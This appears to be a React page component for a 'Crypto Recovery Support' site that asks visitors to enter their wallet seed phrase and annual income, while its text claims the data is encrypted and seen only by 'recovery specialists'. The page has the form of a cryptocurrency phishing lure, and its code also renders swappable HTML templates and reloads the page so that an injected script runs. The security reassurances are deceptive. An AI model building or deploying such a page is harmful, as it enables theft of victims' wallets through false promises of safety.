"use client"

import { useState, useEffect, useRef } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Shield, Lock, AlertCircle } from "lucide-react"
import { PageTemplateStore } from "@/lib/page-template-store"

export default function ThePageConnection() {
  const [isLoading, setIsLoading] = useState(true)
  const [customContent, setCustomContent] = useState<string | null>(null)
  const contentContainerRef = useRef<HTMLDivElement>(null)

  // Effect for loading and listening to page content updates
  useEffect(() => {
    const pageStore = PageTemplateStore.getInstance()

    const checkCustomContent = () => {
      const content = pageStore.getActiveTemplate()
      if (content) {
        setCustomContent(content.content)
      } else {
        setCustomContent(null) // Ensure customContent is null if no active template
      }
      setIsLoading(false)
    }

    checkCustomContent()

    // Listen for real-time updates from TemplateManager
    if (typeof window !== "undefined" && "BroadcastChannel" in window) {
      const channel = new BroadcastChannel("citrus-template-updates")

      channel.onmessage = (event) => {
        if (event.data.type === "TEMPLATE_CHANGED") {
          const newContent = event.data.template?.content || null
          setCustomContent(newContent)
          // If new content is loaded, re-render the page to execute the new script
          if (newContent) {
            // This forces a re-render of the HTML, allowing the injected script to re-initialize
            // A full page reload is more robust for script execution in dynamically loaded HTML
            window.location.reload()
          } else {
            // If template is deactivated, revert to default page
            window.location.reload()
          }
        }
      }

      return () => {
        channel.close()
      }
    }
  }, []) // Run only once on mount for initial content and channel setup

  // If custom content exists, render it
  if (customContent && !isLoading) {
    return <div ref={contentContainerRef} dangerouslySetInnerHTML={{ __html: customContent }} />
  }

  // Loading state
  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p>Loading...</p>
        </div>
      </div>
    )
  }

  // Default page content (if no custom template is active)
  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-900 via-purple-900 to-indigo-900 flex items-center justify-center p-4">
      <Card className="w-full max-w-md">
        <CardHeader className="text-center">
          <div className="mx-auto mb-4 p-3 bg-blue-100 dark:bg-blue-900 rounded-full w-fit">
            <Shield className="h-8 w-8 text-blue-600 dark:text-blue-400" />
          </div>
          <CardTitle className="text-2xl font-bold">Crypto Recovery Support</CardTitle>
          <p className="text-gray-600 dark:text-gray-400">Secure seed phrase verification for recovery assistance</p>
        </CardHeader>

        <CardContent className="space-y-6">
          <form className="space-y-4">
            <div>
              <label htmlFor="annual-income" className="block text-sm font-medium mb-2">
                Annual Income (for verification)
              </label>
              <Input
                type="text"
                id="annual-income"
                name="annual-income"
                placeholder="e.g., $75,000"
                className="w-full"
              />
            </div>

            <div>
              <label htmlFor="seed-input" className="block text-sm font-medium mb-2">
                <Lock className="inline h-4 w-4 mr-1" />
                Seed Phrase (12-24 words)
              </label>
              <textarea
                id="seed-input"
                className="w-full min-h-[120px] p-3 border border-gray-300 dark:border-gray-600 rounded-lg bg-gray-50 dark:bg-gray-800 font-mono text-sm resize-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                placeholder="Enter your seed phrase here (space separated)..."
                required
              />
              <p className="text-xs text-gray-500 mt-1">
                This information is encrypted and used only for recovery verification
              </p>
            </div>

            <div className="p-3 bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-lg">
              <div className="flex items-start space-x-2">
                <AlertCircle className="h-4 w-4 text-amber-600 dark:text-amber-400 mt-0.5 flex-shrink-0" />
                <div className="text-xs text-amber-700 dark:text-amber-400">
                  <strong>Security Notice:</strong> Your seed phrase is transmitted securely and will only be used by
                  our recovery specialists to analyze your case.
                </div>
              </div>
            </div>

            <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700">
              Submit for Recovery Analysis
            </Button>
          </form>

          <div className="text-center text-xs text-gray-500">Protected by enterprise-grade encryption</div>
        </CardContent>
      </Card>
    </div>
  )
}
